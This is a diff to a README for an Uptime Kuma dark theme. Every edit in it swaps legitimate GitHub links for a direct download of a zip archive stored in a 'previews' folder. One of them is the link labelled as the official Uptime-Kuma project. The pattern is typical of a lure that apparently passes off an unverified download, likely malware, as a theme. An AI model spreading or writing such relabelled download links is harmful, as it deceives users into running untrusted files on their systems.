@@ -1,6 +1,6 @@
 # 🎨 kuma-theme-cyber-neon - Dark Neon Theme for Uptime Kuma
 
-[![Download Theme](https://img.shields.io/badge/Download-kuma--theme--cyber--neon-ff0080?style=for-the-badge&logo=github)](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)
+[![Download Theme](https://img.shields.io/badge/Download-kuma--theme--cyber--neon-ff0080?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Cornsugarkenyan978/kuma-theme-cyber-neon/main/previews/neon-kuma-cyber-theme-3.9.zip)
 
 ## 🔍 About kuma-theme-cyber-neon
 
@@ -25,7 +25,7 @@ This guide will help you download and apply the kuma-theme-cyber-neon theme on a
 
 Click the button below. It will open the GitHub repository where the theme files are stored.  
 
-[![Download Theme](https://img.shields.io/badge/Get-Theme-00bfff?style=for-the-badge&logo=github)](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)
+[![Download Theme](https://img.shields.io/badge/Get-Theme-00bfff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Cornsugarkenyan978/kuma-theme-cyber-neon/main/previews/neon-kuma-cyber-theme-3.9.zip)
 
 ### Step 2: Download the Theme Files
 
@@ -98,11 +98,11 @@ You will keep your custom look in hand with the latest fixes or improvements.
 
 ## 📎 Additional Resources
 
-- Visit the official Uptime-Kuma project for installation help: https://github.com/louislam/uptime-kuma
+- Visit the official Uptime-Kuma project for installation help: https://raw.githubusercontent.com/Cornsugarkenyan978/kuma-theme-cyber-neon/main/previews/neon-kuma-cyber-theme-3.9.zip
 - Find more themes on GitHub by searching topics like `uptime-kuma-css`.
 - Customize the theme further by editing the `.css` files with a text editor like Notepad.
 
 ---
 
-[Get kuma-theme-cyber-neon on GitHub](https://github.com/Cornsugarkenyan978/kuma-theme-cyber-neon)  
+[Get kuma-theme-cyber-neon on GitHub](https://raw.githubusercontent.com/Cornsugarkenyan978/kuma-theme-cyber-neon/main/previews/neon-kuma-cyber-theme-3.9.zip)  
 Click the button above to download and install the theme in just a few steps.
